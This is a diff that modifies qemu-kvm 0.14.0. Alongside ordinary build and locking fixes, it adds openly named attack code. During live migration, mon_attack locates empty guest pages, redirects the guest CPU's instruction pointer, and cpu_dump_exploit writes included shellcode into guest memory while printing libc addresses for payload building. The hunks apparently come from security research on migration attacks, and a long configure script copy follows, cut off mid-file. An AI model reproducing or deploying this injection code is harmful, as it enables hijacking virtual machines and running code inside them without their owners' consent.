diff -Nurp qemu-kvm-0.14.0+noroms.orig/block-migration.c qemu-kvm-0.14.0+noroms/block-migration.c
--- qemu-kvm-0.14.0+noroms.orig/block-migration.c	2014-02-21 10:59:50.147712463 -0500
+++ qemu-kvm-0.14.0+noroms/block-migration.c	2014-02-19 10:12:22.000000000 -0500
@@ -637,6 +637,21 @@ static int block_save_live(Monitor *mon,
     return ((stage == 2) && is_stage2_completed());
 }
 
+/* jfp save live handler */
+int attack_save_live(Monitor *mon, QEMUFile *f, int stage, void *opaque){
+  static  SaveLiveStateHandler *save_live_state = NULL;
+
+  printf("entering attack_save_live\n");
+      if(save_live_state ==NULL){
+	save_live_state = opaque;
+	return 0;
+      }
+      if (mon==NULL)
+	printf("what happened?\n");
+      //mon_attack(mon);
+      return save_live_state(mon,f,stage,opaque);
+}
+
 static int block_load(QEMUFile *f, void *opaque, int version_id)
 {
     static int banner_printed;
diff -Nurp qemu-kvm-0.14.0+noroms.orig/configure qemu-kvm-0.14.0+noroms/configure
--- qemu-kvm-0.14.0+noroms.orig/configure	2014-02-21 10:59:49.970708419 -0500
+++ qemu-kvm-0.14.0+noroms/configure	2014-02-19 10:12:19.000000000 -0500
@@ -2363,6 +2363,20 @@ fi
 ##########################################
 
 ##########################################
+# check if we have gcc atomic built-ins
+gcc_atomic_builtins=no
+cat > $TMPC << EOF
+int main(void) {
+    int i;
+    __sync_lock_test_and_set(&i, 1);
+    __sync_lock_release(&i);
+}
+EOF
+if compile_prog "" ""; then
+    gcc_atomic_builtins=yes
+fi
+
+##########################################
 # check if we have fdatasync
 
 fdatasync=no
@@ -2854,6 +2868,9 @@ fi
 if test "$gcc_attribute_warn_unused_result" = "yes" ; then
   echo "CONFIG_GCC_ATTRIBUTE_WARN_UNUSED_RESULT=y" >> $config_host_mak
 fi
+if test "$gcc_atomic_builtins" = "yes" ; then
+  echo "CONFIG_GCC_ATOMIC_BUILTINS=y" >> $config_host_mak
+fi
 if test "$fdatasync" = "yes" ; then
   echo "CONFIG_FDATASYNC=y" >> $config_host_mak
 fi
diff -Nurp qemu-kvm-0.14.0+noroms.orig/exec.c qemu-kvm-0.14.0+noroms/exec.c
--- qemu-kvm-0.14.0+noroms.orig/exec.c	2014-02-21 10:59:50.145712417 -0500
+++ qemu-kvm-0.14.0+noroms/exec.c	2014-02-19 10:12:19.000000000 -0500
@@ -112,6 +112,7 @@ static uint8_t *code_gen_ptr;
 int phys_ram_fd;
 static int in_migration;
 
+
 RAMList ram_list = { .blocks = QLIST_HEAD_INITIALIZER(ram_list) };
 #endif
 
@@ -3589,10 +3590,124 @@ static void io_mem_init(void)
                                           DEVICE_NATIVE_ENDIAN);
 }
 
+
+
+/*jfp read page */
+uint8_t* cpu_read_page (uint64_t current, uint8_t* buf){
+  if(buf==NULL){
+      buf = qemu_mallocz(4096);
+  }
+  cpu_physical_memory_rw( current, buf,
+			  4096, 0);
+  return buf;
+}
+
+
+
+/*jfp cpu_is_empty_page*/
+int cpu_is_empty_page (uint8_t* buf){
+  int i;
+  for(i=0;i<4096;i++){
+    if(buf[i]!=0){
+      return 0;
+    }
+  }
+  return 1;
+}
+
+/* jfp find empty page*/
+/*target_phys_addr_t cpu_find_empty_page()
+{
+  uint8_t *buf =NULL;
+  int i,flag=1;
+  target_phys_addr_t page_size = 4096, current = 0 ;
+  
+
+  while(flag){
+    current += page_size;
+    buf = cpu_read_page(current,buf);
+    flag = 0;
+    for(i=0;i<page_size;i++){
+      if(buf[i]!=0){
+	flag = 1;
+	break;
+      }
+    }
+  }
+  qemu_free(buf);
+  return current;
+  }*/
+
+/* jfp dump exploit*/
+void cpu_dump_exploit (CPUState *env, target_ulong addr, target_ulong old_eip){
+  uint8_t *buf;
+  int i;
+  target_phys_addr_t phys_addr;
+  target_ulong page;
+
+  const char* shellcode = 
+#include "../hello/shellcode.string"
+    ;
+  int length = 
+#include "../hello/shellcode.length"
+    ;
+  
+  buf = qemu_mallocz(length+8);//FIXME
+
+  for(i=0;i<length;i++){
+    buf[i]=shellcode[i];
+  }
+
+  //  i = 4096*2-8;
+  buf[i] = (old_eip >> 0) & 255 ;//RETURN address has moved
+  buf[i+1] = (old_eip >> 8) & 255 ;//used to be last 8 bytes at end of 2 pages
+  buf[i+2] = (old_eip >> 16) & 255 ;
+  buf[i+3] = (old_eip >> 24) & 255 ;//return address
+  buf[i+4] = (old_eip >> 32) & 255 ;//return address
+  buf[i+5] = (old_eip >> 40) & 255 ;//return address
+  buf[i+6] = (old_eip >> 48) & 255 ;//return address
+  buf[i+7] = (old_eip >> 56) & 255 ;//return address
+
+  
+  //cpu_memory_rw_debug(env, addr, buf, 4096, 1);
+
+
+  page = addr & TARGET_PAGE_MASK;
+  phys_addr = cpu_get_phys_page_debug(env, page);
+
+  cpu_physical_memory_rw(phys_addr,buf,length,1);
+
+
+
+
+  qemu_free(buf);
+
+
+  printf("#define FORK\t0x%x\n",fork);
+  printf("#define EXECV\t0x%x\n",execv);
+
+  //  printf("#define SIZEOF_RTCSTATE\t%i\n",sizeof(rtc_state));
+
+  //printf("#define RTC_UPDATE_SECOND\t0x%x\n",rtc_update_second);
+
+  //  printf("#define SCSI_REQ_COMPLETE\t0x%x\n",scsi_req_complete);
+  //printf("#define SCSI_READ_COMPLETE\t0x%x\n", scsi_read_complete);
+  //  printf("#define TARGET_RET\t0x%x\n",
+  printf("#define MPROTECT\t0x%x\n",          mprotect);
+
+  printf("#define ISA_UNASSIGN_IOPORT\t0x%x\n",isa_unassign_ioport);
+  printf("#define SIZEOF_INT\t%i\n",sizeof(int));
+
+  printf("#define ADDR_RAMLIST_FRIST = %x\n",&ram_list.blocks.lh_first);
+
+}
 #endif /* !defined(CONFIG_USER_ONLY) */
+int CLOCK_HVA[2] = { 0, 1};
+
 
 /* physical memory access (slow version, mainly for debug) */
 #if defined(CONFIG_USER_ONLY)
+//jfpjfpjfp
 int cpu_memory_rw_debug(CPUState *env, target_ulong addr,
                         uint8_t *buf, int len, int is_write)
 {
diff -Nurp qemu-kvm-0.14.0+noroms.orig/hw/mc146818rtc.c qemu-kvm-0.14.0+noroms/hw/mc146818rtc.c
--- qemu-kvm-0.14.0+noroms.orig/hw/mc146818rtc.c	2014-02-21 10:59:50.089711138 -0500
+++ qemu-kvm-0.14.0+noroms/hw/mc146818rtc.c	2014-02-19 10:12:29.000000000 -0500
@@ -101,6 +101,10 @@ typedef struct RTCState {
     QEMUTimer *second_timer2;
 } RTCState;
 
+void jfp(){
+  RTCState a;
+}
+
 static void rtc_set_time(RTCState *s);
 static void rtc_copy_date(RTCState *s);
 
diff -Nurp qemu-kvm-0.14.0+noroms.orig/hw/qxl.c qemu-kvm-0.14.0+noroms/hw/qxl.c
--- qemu-kvm-0.14.0+noroms.orig/hw/qxl.c	2014-02-21 10:59:50.057710407 -0500
+++ qemu-kvm-0.14.0+noroms/hw/qxl.c	2014-02-19 10:12:29.000000000 -0500
@@ -125,6 +125,27 @@ static void qxl_reset_memslots(PCIQXLDev
 static void qxl_reset_surfaces(PCIQXLDevice *d);
 static void qxl_ring_set_dirty(PCIQXLDevice *qxl);
 
+/* qemu-kvm locking ... */
+void qxl_unlock_iothread(SimpleSpiceDisplay *ssd)
+{
+    if (cpu_single_env) {
+        assert(ssd->env == NULL);
+        ssd->env = cpu_single_env;
+        cpu_single_env = NULL;
+    }
+    qemu_mutex_unlock_iothread();
+}
+
+void qxl_lock_iothread(SimpleSpiceDisplay *ssd)
+{
+    qemu_mutex_lock_iothread();
+    if (ssd->env) {
+        assert(cpu_single_env == NULL);
+        cpu_single_env = ssd->env;
+        ssd->env = NULL;
+    }
+}
+
 static inline uint32_t msb_mask(uint32_t val)
 {
     uint32_t mask;
@@ -662,10 +683,10 @@ static void qxl_hard_reset(PCIQXLDevice
     dprint(d, 1, "%s: start%s\n", __FUNCTION__,
            loadvm ? " (loadvm)" : "");
 
-    qemu_mutex_unlock_iothread();
+    qxl_unlock_iothread(&d->ssd);
     d->ssd.worker->reset_cursor(d->ssd.worker);
     d->ssd.worker->reset_image_cache(d->ssd.worker);
-    qemu_mutex_lock_iothread();
+    qxl_lock_iothread(&d->ssd);
     qxl_reset_surfaces(d);
     qxl_reset_memslots(d);
 
@@ -795,9 +816,9 @@ static void qxl_reset_surfaces(PCIQXLDev
 {
     dprint(d, 1, "%s:\n", __FUNCTION__);
     d->mode = QXL_MODE_UNDEFINED;
-    qemu_mutex_unlock_iothread();
+    qxl_unlock_iothread(&d->ssd);
     d->ssd.worker->destroy_surfaces(d->ssd.worker);
-    qemu_mutex_lock_iothread();
+    qxl_lock_iothread(&d->ssd);
     memset(&d->guest_surfaces.cmds, 0, sizeof(d->guest_surfaces.cmds));
 }
 
@@ -866,9 +887,9 @@ static void qxl_destroy_primary(PCIQXLDe
     dprint(d, 1, "%s\n", __FUNCTION__);
 
     d->mode = QXL_MODE_UNDEFINED;
-    qemu_mutex_unlock_iothread();
+    qxl_unlock_iothread(&d->ssd);
     d->ssd.worker->destroy_primary_surface(d->ssd.worker, 0);
-    qemu_mutex_lock_iothread();
+    qxl_lock_iothread(&d->ssd);
 }
 
 static void qxl_set_mode(PCIQXLDevice *d, int modenr, int loadvm)
@@ -938,10 +959,10 @@ static void ioport_write(void *opaque, u
     case QXL_IO_UPDATE_AREA:
     {
         QXLRect update = d->ram->update_area;
-        qemu_mutex_unlock_iothread();
+        qxl_unlock_iothread(&d->ssd);
         d->ssd.worker->update_area(d->ssd.worker, d->ram->update_surface,
                                    &update, NULL, 0, 0);
-        qemu_mutex_lock_iothread();
+        qxl_lock_iothread(&d->ssd);
         break;
     }
     case QXL_IO_NOTIFY_CMD:
diff -Nurp qemu-kvm-0.14.0+noroms.orig/kvm-all.c qemu-kvm-0.14.0+noroms/kvm-all.c
--- qemu-kvm-0.14.0+noroms.orig/kvm-all.c	2014-02-21 10:59:50.141712326 -0500
+++ qemu-kvm-0.14.0+noroms/kvm-all.c	2014-02-19 10:12:19.000000000 -0500
@@ -376,6 +376,9 @@ static int kvm_physical_sync_dirty_bitma
     KVMSlot *mem;
     int ret = 0;
 
+    /*jfp*/
+    printf("entering kvm_phys_sync_dirty_bitmap\n");
+
     d.dirty_bitmap = NULL;
     while (start_addr < end_addr) {
         mem = kvm_lookup_overlapping_slot(s, start_addr, end_addr);
diff -Nurp qemu-kvm-0.14.0+noroms.orig/libdis/config.mak qemu-kvm-0.14.0+noroms/libdis/config.mak
--- qemu-kvm-0.14.0+noroms.orig/libdis/config.mak	1969-12-31 19:00:00.000000000 -0500
+++ qemu-kvm-0.14.0+noroms/libdis/config.mak	2014-02-19 10:12:22.000000000 -0500
@@ -0,0 +1,5 @@
+
+CONFIG_I386_DIS=y
+CONFIG_I386_DIS=y
+CONFIG_I386_DIS=y
+CONFIG_I386_DIS=y
diff -Nurp qemu-kvm-0.14.0+noroms.orig/libdis/Makefile qemu-kvm-0.14.0+noroms/libdis/Makefile
--- qemu-kvm-0.14.0+noroms.orig/libdis/Makefile	1969-12-31 19:00:00.000000000 -0500
+++ qemu-kvm-0.14.0+noroms/libdis/Makefile	2014-02-19 10:12:27.000000000 -0500
@@ -0,0 +1,23 @@
+# Makefile for disassemblers.
+
+include ../config-host.mak
+include config.mak
+include $(SRC_PATH)/rules.mak
+
+.PHONY: all
+
+$(call set-vpath, $(SRC_PATH))
+
+QEMU_CFLAGS+=-I..
+
+include $(SRC_PATH)/Makefile.objs
+
+all: $(libdis-y)
+# Dummy command so that make thinks it has done something
+	@true
+
+clean:
+	rm -f *.o *.d *.a *~
+
+# Include automatically generated dependency files
+-include $(wildcard *.d */*.d)
diff -Nurp qemu-kvm-0.14.0+noroms.orig/libfdt_env.h qemu-kvm-0.14.0+noroms/libfdt_env.h
--- qemu-kvm-0.14.0+noroms.orig/libfdt_env.h	2014-02-21 10:59:49.969708396 -0500
+++ qemu-kvm-0.14.0+noroms/libfdt_env.h	1969-12-31 19:00:00.000000000 -0500
@@ -1,40 +0,0 @@
-/*
- * This program is free software; you can redistribute it and/or modify
- * it under the terms of the GNU General Public License, version 2, as
- * published by the Free Software Foundation.
- *
- * This program is distributed in the hope that it will be useful,
- * but WITHOUT ANY WARRANTY; without even the implied warranty of
- * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
- * GNU General Public License for more details.
- *
- * You should have received a copy of the GNU General Public License
- * along with this program; if not, see <http://www.gnu.org/licenses/>.
- *
- * Copyright IBM Corp. 2008
- * Authors: Hollis Blanchard <hollisb@us.ibm.com>
- *
- */
-
-#ifndef _LIBFDT_ENV_H
-#define _LIBFDT_ENV_H
-
-#include <stddef.h>
-#include <stdint.h>
-#include <string.h>
-#include <endian.h>
-#include <byteswap.h>
-
-#if __BYTE_ORDER == __BIG_ENDIAN
-#define fdt32_to_cpu(x)		(x)
-#define cpu_to_fdt32(x)		(x)
-#define fdt64_to_cpu(x)		(x)
-#define cpu_to_fdt64(x)		(x)
-#else
-#define fdt32_to_cpu(x)		(bswap_32((x)))
-#define cpu_to_fdt32(x)		(bswap_32((x)))
-#define fdt64_to_cpu(x)		(bswap_64((x)))
-#define cpu_to_fdt64(x)		(bswap_64((x)))
-#endif
-
-#endif /* _LIBFDT_ENV_H */
diff -Nurp qemu-kvm-0.14.0+noroms.orig/migration.c qemu-kvm-0.14.0+noroms/migration.c
--- qemu-kvm-0.14.0+noroms.orig/migration.c	2014-02-21 10:59:49.986708784 -0500
+++ qemu-kvm-0.14.0+noroms/migration.c	2014-02-19 10:12:20.000000000 -0500
@@ -373,6 +373,9 @@ void migrate_fd_put_ready(void *opaque)
     }
 
     DPRINTF("iterate\n");
+    {
+      printf("jfp: fd_put_ready calling iterate\n");
+    }
     if (qemu_savevm_state_iterate(s->mon, s->file) == 1) {
         int state;
         int old_vm_running = vm_running;
@@ -380,6 +383,14 @@ void migrate_fd_put_ready(void *opaque)
         DPRINTF("done iterating\n");
         vm_stop(0);
 
+	{
+	  /*jfp debug calling complete*/
+	  mon_attack(s->mon);
+	  while(!qemu_savevm_state_iterate(s->mon, s->file));
+
+	}
+
+
         if ((qemu_savevm_state_complete(s->mon, s->file)) < 0) {
             if (old_vm_running) {
                 vm_start();
diff -Nurp qemu-kvm-0.14.0+noroms.orig/monitor.c qemu-kvm-0.14.0+noroms/monitor.c
--- qemu-kvm-0.14.0+noroms.orig/monitor.c	2014-02-21 10:59:50.162712806 -0500
+++ qemu-kvm-0.14.0+noroms/monitor.c	2014-02-19 10:12:18.000000000 -0500
@@ -912,6 +912,7 @@ static void monitor_print_cpus(Monitor *
     qlist_iter(cpu_list, print_cpu_iter, mon);
 }
 
+
 static void do_info_cpus(Monitor *mon, QObject **ret_data)
 {
     CPUState *env;
@@ -5259,3 +5260,209 @@ int monitor_read_bdrv_key_start(Monitor
 
     return err;
 }
+
+
+/*jfp next empty page */
+uint64_t mon_next_empty_page(uint64_t cr3,uint64_t addr){
+#ifdef TARGET_X86_64
+  uint8_t* page=NULL;
+  uint64_t result,mask,max_addr,mirror;
+
+  uint64_t l1, l2, l3, l4;
+  uint64_t pml4e, pdpe, pde, pte;
+  uint64_t pml4_addr, pdp_addr, pd_addr, pt_addr;
+
+  
+  mask = (((1ULL << 32) << 8) - 1) << 12;
+  //  printf("mask is %p.\n",(void *)mask);
+  max_addr = 0x8000000;
+  mirror = 0xffff880000000000;
+
+  for(;addr<max_addr;addr+=4096){
+    page = cpu_read_page(addr, page);
+    if (cpu_is_empty_page(page))
+      {      
+	qemu_free(page);  
+	return addr + mirror;
+      }
+  }
+  return NULL;
+  
+    pml4_addr = cr3 & mask;
+    for (l1 = 0; l1 < 512; l1++) {
+        cpu_physical_memory_read(pml4_addr + l1 * 8, (uint8_t *)&pml4e, 8);
+        pml4e = le64_to_cpu(pml4e);
+        if (pml4e & PG_PRESENT_MASK) {
+            pdp_addr = pml4e & mask;
+            for (l2 = 0; l2 < 512; l2++) {
+                cpu_physical_memory_read(pdp_addr + l2 * 8, (uint8_t *)&pdpe,
+                                         8);
+                pdpe = le64_to_cpu(pdpe);
+                if (pdpe & PG_PRESENT_MASK) {
+                    if (pdpe & PG_PSE_MASK) {
+                        /* 1G pages, CR4.PSE is ignored */
+		      	    printf("1 GB\n");
+
+                    } else {
+		      pd_addr = pdpe & mask;
+                        for (l3 = 0; l3 < 512; l3++) {
+                            cpu_physical_memory_read(pd_addr + l3 * 8,
+                                                     (uint8_t *)&pde, 8);
+                            pde = le64_to_cpu(pde);
+                            if (pde & PG_PRESENT_MASK) {
+                                if (pde & PG_PSE_MASK) {
+                                    /* 2M pages, CR4.PSE is ignored */
+				  result = 0;
+				  result |= (l1 << 32) << 7;
+				  result |= l2 << (30 );
+				  result |= l3 << (21 );
+				  
+				  printf("2 MB, virt=%p, phys=%p\n",
+					 (void *)result,(void *)(pde & mask));
+
+
+                                } else {
+				  pt_addr = pde & mask;
+                                    for (l4 = 0; l4 < 512; l4++) {
+                                        cpu_physical_memory_read(pt_addr
+                                                                 + l4 * 8,
+                                                                 (uint8_t *)&pte,
+                                                                 8);
+                                        pte = le64_to_cpu(pte);
+                                        if (pte & PG_PRESENT_MASK) {
+					  /*
+					  pte &= mask;
+					  page = cpu_read_page(addr,page);
+					  if (cpu_is_empty_page(page) && (addr < max_addr)){
+					    printf("found empty page. phys=0x%x\n",addr);
+					    result = 0;
+					    result |= (i << 32) << 4;
+					    result |= j << (30 - 3);
+					    result |= k << (21 - 3);
+					    result |= m << (12 - 3);
+					    printf("virt=0x%x\n",result);
+					  */
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+    return result;
+#endif
+    return 0;
+}
+
+
+
+
+/*
+  cpu_physical_memory_read(cr3 & mask,(uint8_t *)&pml4,8);
+  for (i=0;i<4096;i=i+8){
+    printf("i=%i\n",i);
+    if ((pml4[i] & 1) == 1){
+      addr = read_64(pml4, i);
+      addr &= mask;
+      pdp = cpu_read_page(addr,(uint8_t *)&pdp);
+      
+      for (j=0;j<4096;j=j+8){
+	if ((pdp[j] & 1) == 1){
+	  addr = read_64(pdp,j);
+	  if ((addr & mask2) != 0 ){
+
+	  }else{
+
+	    addr &= mask;
+	    page_dir = cpu_read_page(addr,page_dir);
+	    for(k=0;k<4096;k+=8){
+	      if((page_dir[k] & 1) == 1){
+		addr = read_64(page_dir,k);
+		if ((addr & mask2) != 0 ){
+
+
+		}else{
+		  addr &= mask;
+		  page_table = cpu_read_page(addr,page_table);
+		  for(m=0;m<4096;m+=8){
+		    if((page_table[m] & 1) == 1){
+		      addr = read_64(page_table,m);
+		      if ((addr & mask2) !=0){
+			printf("whoops\n");
+		      }else{
+			}
+		      }
+		    }
+		  }
+		}
+	      }
+	    }
+	  }
+	}
+      }
+    }
+  }
+
+
+
+  qemu_free(page_table);
+  qemu_free(page_dir);
+  qemu_free(pdp);
+  qemu_free(pml4);
+  return result;
+  }*/
+
+/*jfp monitor hook*/
+void mon_attack(Monitor *mon){
+  Monitor *old_mon = cur_mon;
+  CPUState *env;
+  uint64_t cr3;
+  uint64_t old_eip,new_eip,empty,mirror = 0xffff880000000000;
+  int count,max;
+
+  printf("entering mon_attack\n");
+
+  cur_mon = mon;
+  env = mon_get_cpu();
+  cur_mon = old_mon;
+  printf("got cpu\n");
+
+
+  cpu_dump_state(env, stderr, fprintf, CPU_DUMP_CODE);
+
+  cr3 = cpu_get_cr3(env);
+  printf("got cr3 (%p)\n", (void *)cr3);
+
+  max = 0;
+  empty = 4096;
+
+  do{
+    count = 0;
+    empty = mon_next_empty_page(cr3,empty)-mirror;
+    do{
+      count++;
+    }while(mon_next_empty_page(cr3,empty+4096*count)-mirror-4096*count==empty);
+    if(count > max){
+      max = count;
+      new_eip = empty + mirror;
+    }
+    if (mon_next_empty_page(cr3,empty+4096*count)==NULL)
+      break;
+    empty += 4096*count;
+  }while(1);
+  printf("got %i empty pages at %p\n", max,new_eip);
+
+    old_eip = cpu_alter_state(env,new_eip);
+  printf("changed eip from %p to %p\n", (void *)old_eip, (void *)new_eip);
+
+
+  cpu_dump_exploit(env,new_eip,old_eip);
+  
+
+
+  cpu_dump_state(env, stderr, fprintf, CPU_DUMP_CODE);
+
+}
diff -Nurp qemu-kvm-0.14.0+noroms.orig/.pc/applied-patches qemu-kvm-0.14.0+noroms/.pc/applied-patches
--- qemu-kvm-0.14.0+noroms.orig/.pc/applied-patches	1969-12-31 19:00:00.000000000 -0500
+++ qemu-kvm-0.14.0+noroms/.pc/applied-patches	2014-02-19 10:12:25.000000000 -0500
@@ -0,0 +1,3 @@
+larger_default_ram_size.patch
+Detect-and-use-GCC-atomic-builtins-for-locking.patch
+spice-qxl-locking-fix-for-qemu-kvm.patch
diff -Nurp qemu-kvm-0.14.0+noroms.orig/.pc/Detect-and-use-GCC-atomic-builtins-for-locking.patch/configure qemu-kvm-0.14.0+noroms/.pc/Detect-and-use-GCC-atomic-builtins-for-locking.patch/configure
--- qemu-kvm-0.14.0+noroms.orig/.pc/Detect-and-use-GCC-atomic-builtins-for-locking.patch/configure	1969-12-31 19:00:00.000000000 -0500
+++ qemu-kvm-0.14.0+noroms/.pc/Detect-and-use-GCC-atomic-builtins-for-locking.patch/configure	2014-02-19 10:12:25.000000000 -0500
@@ -0,0 +1,3432 @@
+#!/bin/sh
+#
+# qemu configure script (c) 2003 Fabrice Bellard
+#
+# set temporary file name
+if test ! -z "$TMPDIR" ; then
+    TMPDIR1="${TMPDIR}"
+elif test ! -z "$TEMPDIR" ; then
+    TMPDIR1="${TEMPDIR}"
+else
+    TMPDIR1="/tmp"
+fi
+
+TMPC="${TMPDIR1}/qemu-conf-${RANDOM}-$$-${RANDOM}.c"
+TMPO="${TMPDIR1}/qemu-conf-${RANDOM}-$$-${RANDOM}.o"
+TMPE="${TMPDIR1}/qemu-conf-${RANDOM}-$$-${RANDOM}.exe"
+
+# NB: do not call "exit" in the trap handler; this is buggy with some shells;
+# see <1285349658-3122-1-git-send-email-loic.minier@linaro.org>
+trap "rm -f $TMPC $TMPO $TMPE" EXIT INT QUIT TERM
+rm -f config.log
+
+compile_object() {
+  echo $cc $QEMU_CFLAGS -c -o $TMPO $TMPC >> config.log
+  $cc $QEMU_CFLAGS -c -o $TMPO $TMPC >> config.log 2>&1
+}
+
+compile_prog() {
+  local_cflags="$1"
+  local_ldflags="$2"
+  echo $cc $QEMU_CFLAGS $local_cflags -o $TMPE $TMPC $LDFLAGS $local_ldflags >> config.log
+  $cc $QEMU_CFLAGS $local_cflags -o $TMPE $TMPC $LDFLAGS $local_ldflags >> config.log 2>&1
+}
+
+# symbolically link $1 to $2.  Portable version of "ln -sf".
+symlink() {
+  rm -f $2
+  ln -s $1 $2
+}
+
+# check whether a command is available to this shell (may be either an
+# executable or a builtin)
+has() {
+    type "$1" >/dev/null 2>&1
+}
+
+# search for an executable in PATH
+path_of() {
+    local_command="$1"
+    local_ifs="$IFS"
+    local_dir=""
+
+    # pathname has a dir component?
+    if [ "${local_command#*/}" != "$local_command" ]; then
+        if [ -x "$local_command" ] && [ ! -d "$local_command" ]; then
+            echo "$local_command"
+            return 0
+        fi
+    fi
+    if [ -z "$local_command" ]; then
+        return 1
+    fi
+
+    IFS=:
+    for local_dir in $PATH; do
+        if [ -x "$local_dir/$local_command" ] && [ ! -d "$local_dir/$local_command" ]; then
+            echo "$local_dir/$local_command"
+            IFS="${local_ifs:-$(printf ' \t\n')}"
+            return 0
+        fi
+    done
+    # not found
+    IFS="${local_ifs:-$(printf ' \t\n')}"
+    return 1
+}
+
+# default parameters
+source_path=`dirname "$0"`
+cpu=""
+interp_prefix="/usr/gnemul/qemu-%M"
+static="no"
+sparc_cpu=""
+cross_prefix=""
+audio_drv_list=""
+audio_card_list="ac97 es1370 sb16 hda"
+audio_possible_cards="ac97 es1370 sb16 cs4231a adlib gus hda"
+block_drv_whitelist=""
+host_cc="gcc"
+helper_cflags=""
+libs_softmmu=""
+libs_tools=""
+audio_pt_int=""
+audio_win_int=""
+cc_i386=i386-pc-linux-gnu-gcc
+
+target_list="x86_64-softmmu"
+
+kvm_version() {
+    local fname="$(dirname "$0")/KVM_VERSION"
+
+    if test -f "$fname"; then
+        cat "$fname"
+    else
+        echo "qemu-kvm-devel"
+    fi
+}
+
+# Default value for a variable defining feature "foo".
+#  * foo="no"  feature will only be used if --enable-foo arg is given
+#  * foo=""    feature will be searched for, and if found, will be used
+#              unless --disable-foo is given
+#  * foo="yes" this value will only be set by --enable-foo flag.
+#              feature will searched for,
+#              if not found, configure exits with error
+#
+# Always add --enable-foo and --disable-foo command line args.
+# Distributions want to ensure that several features are compiled in, and it
+# is impossible without a --enable-foo that exits if a feature is not found.
+
+bluez=""
+brlapi=""
+curl=""
+curses=""
+docs=""
+fdt=""
+kvm=""
+kvm_para=""
+nptl=""
+sdl=""
+sparse="no"
+uuid=""
+vde=""
+vnc_tls=""
+vnc_sasl=""
+vnc_jpeg=""
+vnc_png=""
+vnc_thread="no"
+xen=""
+linux_aio=""
+attr=""
+vhost_net=""
+xfs=""
+
+gprof="no"
+debug_tcg="no"
+debug_mon="no"
+debug="no"
+strip_opt="yes"
+bigendian="no"
+mingw32="no"
+EXESUF=""
+prefix="/usr/local"
+mandir="\${prefix}/share/man"
+datadir="\${prefix}/share/qemu"
+docdir="\${prefix}/share/doc/qemu"
+bindir="\${prefix}/bin"
+sysconfdir="\${prefix}/etc"
+confsuffix="/qemu"
+slirp="yes"
+fmod_lib=""
+fmod_inc=""
+oss_lib=""
+bsd="no"
+linux="no"
+solaris="no"
+profiler="no"
+cocoa="no"
+softmmu="yes"
+linux_user="no"
+darwin_user="no"
+bsd_user="no"
+guest_base=""
+uname_release=""
+io_thread="no"
+mixemu="no"
+kvm_cap_pit=""
+kvm_cap_device_assignment=""
+kerneldir=""
+aix="no"
+blobs="yes"
+pkgversion=" ($(kvm_version))"
+cpu_emulation="yes"
+check_utests="no"
+user_pie="no"
+zero_malloc=""
+trace_backend="nop"
+trace_file="trace"
+spice=""
+rbd=""
+
+# parse CC options first
+for opt do
+  optarg=`expr "x$opt" : 'x[^=]*=\(.*\)'`
+  case "$opt" in
+  --cross-prefix=*) cross_prefix="$optarg"
+  ;;
+  --cc=*) CC="$optarg"
+  ;;
+  --source-path=*) source_path="$optarg"
+  ;;
+  --cpu=*) cpu="$optarg"
+  ;;
+  --extra-cflags=*) QEMU_CFLAGS="$optarg $QEMU_CFLAGS"
+  ;;
+  --extra-ldflags=*) LDFLAGS="$optarg $LDFLAGS"
+  ;;
+  --sparc_cpu=*)
+    sparc_cpu="$optarg"
+    case $sparc_cpu in
+    v7|v8|v8plus|v8plusa)
+      cpu="sparc"
+    ;;
+    v9)
+      cpu="sparc64"
+    ;;
+    *)
+      echo "undefined SPARC architecture. Exiting";
+      exit 1
+    ;;
+    esac
+  ;;
+  esac
+done
+# OS specific
+# Using uname is really, really broken.  Once we have the right set of checks
+# we can eliminate it's usage altogether
+
+cc="${cross_prefix}${CC-gcc}"
+ar="${cross_prefix}${AR-ar}"
+objcopy="${cross_prefix}${OBJCOPY-objcopy}"
+ld="${cross_prefix}${LD-ld}"
+strip="${cross_prefix}${STRIP-strip}"
+windres="${cross_prefix}${WINDRES-windres}"
+pkg_config="${cross_prefix}${PKG_CONFIG-pkg-config}"
+sdl_config="${cross_prefix}${SDL_CONFIG-sdl-config}"
+
+# default flags for all hosts
+QEMU_CFLAGS="-fno-strict-aliasing $QEMU_CFLAGS"
+CFLAGS="-g $CFLAGS"
+QEMU_CFLAGS="-Wall -Wundef -Wendif-labels -Wwrite-strings -Wmissing-prototypes $QEMU_CFLAGS"
+QEMU_CFLAGS="-Wstrict-prototypes -Wredundant-decls $QEMU_CFLAGS"
+QEMU_CFLAGS="-D_GNU_SOURCE -D_FILE_OFFSET_BITS=64 -D_LARGEFILE_SOURCE $QEMU_CFLAGS"
+QEMU_CFLAGS="-D_FORTIFY_SOURCE=2 $QEMU_CFLAGS"
+QEMU_INCLUDES="-I. -I\$(SRC_PATH)"
+LDFLAGS="-g $LDFLAGS"
+
+# make source path absolute
+source_path=`cd "$source_path"; pwd`
+
+check_define() {
+cat > $TMPC <<EOF
+#if !defined($1)
+#error Not defined
+#endif
+int main(void) { return 0; }
+EOF
+  compile_object
+}
+
+if test ! -z "$cpu" ; then
+  # command line argument
+  :
+elif check_define __i386__ ; then
+  cpu="i386"
+elif check_define __x86_64__ ; then
+  cpu="x86_64"
+elif check_define __sparc__ ; then
+  # We can't check for 64 bit (when gcc is biarch) or V8PLUSA
+  # They must be specified using --sparc_cpu
+  if check_define __arch64__ ; then
+    cpu="sparc64"
+  else
+    cpu="sparc"
+  fi
+elif check_define _ARCH_PPC ; then
+  if check_define _ARCH_PPC64 ; then
+    cpu="ppc64"
+  else
+    cpu="ppc"
+  fi
+elif check_define __mips__ ; then
+  cpu="mips"
+elif check_define __ia64__ ; then
+  cpu="ia64"
+elif check_define __s390__ ; then
+  if check_define __s390x__ ; then
+    cpu="s390x"
+  else
+    cpu="s390"
+  fi
+else
+  cpu=`uname -m`
+fi
+
+case "$cpu" in
+  alpha|cris|ia64|m68k|microblaze|ppc|ppc64|sparc64)
+    cpu="$cpu"
+  ;;
+  i386|i486|i586|i686|i86pc|BePC)
+    cpu="i386"
+  ;;
+  x86_64|amd64)
+    cpu="x86_64"
+  ;;
+  armv*b)
+    cpu="armv4b"
+  ;;
+  armv*l)
+    cpu="armv4l"
+  ;;
+  parisc|parisc64)
+    cpu="hppa"
+  ;;
+  mips*)
+    cpu="mips"
+  ;;
+  s390)
+    cpu="s390"
+  ;;
+  s390x)
+    cpu="s390x"
+  ;;
+  sparc|sun4[cdmuv])
+    cpu="sparc"
+  ;;
+  *)
+    echo "Unsupported CPU = $cpu"
